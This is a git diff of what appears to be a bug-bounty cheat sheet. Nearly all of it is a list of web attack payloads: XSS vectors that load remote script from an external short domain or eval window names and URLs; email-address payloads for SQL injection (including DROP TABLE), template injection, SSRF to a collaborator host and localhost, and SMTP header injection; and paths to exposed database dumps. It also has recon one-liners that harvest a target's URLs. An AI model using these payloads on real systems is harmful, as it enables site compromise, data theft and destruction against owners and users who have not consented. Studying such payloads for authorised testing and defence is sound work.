@@ -66,34 +66,34 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 	?print={payload}
 
 ## Small Payloads: 
-	<!-- If number of iframes on the page is constant -->
-	<iframe/onload=src=top[0].name+/\Ǌ.₨?/>
+	-<!-- If number of iframes on the page is constant -->
+	-<iframe/onload=src=top[0].name+/\Ǌ.₨?/>
 
-	<!-- If number of iframes on the page is random -->
-	<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
+	-<!-- If number of iframes on the page is random -->
+	-<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
 
-	<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
-	<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
+	-<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
+	-<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
 
-	<!-- Just a casual script -->
-	<script/src=//Ǌ.₨></script>
+	-<!-- Just a casual script -->
+	-<script/src=//Ǌ.₨></script>
 
-	<!-- If you control the name of the window -->
-	<iframe/onload=src=top.name>
+	-<!-- If you control the name of the window -->
+	-<iframe/onload=src=top.name>
 
-	<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
-	<svg/onload=eval(name)>
+	-<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
+	-<svg/onload=eval(name)>
 
-	<!-- If you control the URL -->
-	<svg/onload=eval(`'`+URL)>
+	-<!-- If you control the URL -->
+	-<svg/onload=eval(`'`+URL)>
 
 ##  Finding sensitive information using AlienVault:
 
-	Go To :  https://otx.alienvault.com/indicator/domain/<TARGET>
-	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
+	-Go To :  https://otx.alienvault.com/indicator/domain/<TARGET>
+	-curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
 	
-	To get only the list of URLs, we could do this:
-	curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
+	-To get only the list of URLs, we could do this:
+	-curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
 ##  Forgotten Database Dumps:
 	/back.sql
 	/backup.sql
@@ -119,32 +119,42 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 
 ##  Email Address Payloads: 
-	XSS (Cross-Site Scripting):
+	-XSS (Cross-Site Scripting):
 
-	test+(<script>alert(0)</script>)@example.com
-	test@example(<script>alert(0)</script>).com
-	"<script>alert(0)</script>"@example.com
+	-test+(<script>alert(0)</script>)@example.com
+	-test@example(<script>alert(0)</script>).com
+	-"<script>alert(0)</script>"@example.com
 
-	Template injection:
+##Template injection:
 
 	"<%= 7 * 7 %>"@example.com
 	test+(${{7*7}})@example.com
 
 	SQL injection:
 
-	"' OR 1=1 -- '"@example.com
-	"mail'); DROP TABLE users;--"@example.com
+	-"' OR 1=1 -- '"@example.com
+	-"mail'); DROP TABLE users;--"@example.com
 
-	SSRF (Server-Side Request Forgery):
+	-SSRF (Server-Side Request Forgery):
 
-	john.doe@abc123.burpcollaborator.net
-	john.doe@[127.0.0.1]
+	-john.doe@abc123.burpcollaborator.net
+	-john.doe@[127.0.0.1]
 
 ##  Parameter pollution:
 
-	victim&email=attacker@example.com
+	-victim&email=attacker@example.com
 
 ##  (Email) header injection:
 
-	"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
-	"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+	-"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+	-"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+	
+## Extracting endpoints from JavaScript files:
+	-cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
+
+## Extracting Juicy Information:
+	-for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done
+
+## Extracting all the urls from sitemap
+	-curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
+
